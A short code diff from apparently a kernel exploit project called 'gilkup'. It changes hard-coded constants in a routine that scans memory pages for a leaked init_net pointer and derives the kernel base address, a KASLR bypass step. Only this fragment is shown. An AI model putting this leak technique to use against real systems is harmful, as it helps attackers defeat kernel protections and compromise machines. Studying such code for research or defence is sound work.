@@ -247,12 +247,12 @@ static inline void scan_pages(const char* ptr, u16 num_pages)
 	//last bytes of init_net on my machine TODO: change it according to /proc/kallsyms
 	for (p = (u64*)ptr; p < (u64*)end; ++p) {
 		if ((*p & 0xffffffff000fffffULL) ==
-			  0xffffffff000df300ULL) {
+			  0xffffffff000e9040ULL) {
 			trace_printk("gilkup kernel pointer %p\n", (void*)*p);
 
 			//There is a small chance to see another pointer with the same suffix once in a while.
 			//If it happens, we can simpely count them and take the best out of 3 or something.
-			gilkup_vars.kernel_base = *p - 0xfdf300;
+			gilkup_vars.kernel_base = *p - 0xfe9040;
 		} else if ((*p & 0xffffe00000000000ULL) ==
 				 0xffff800000000000ULL) {
 			trace_printk("gilkup data pointer %p\n", (void*)*p);
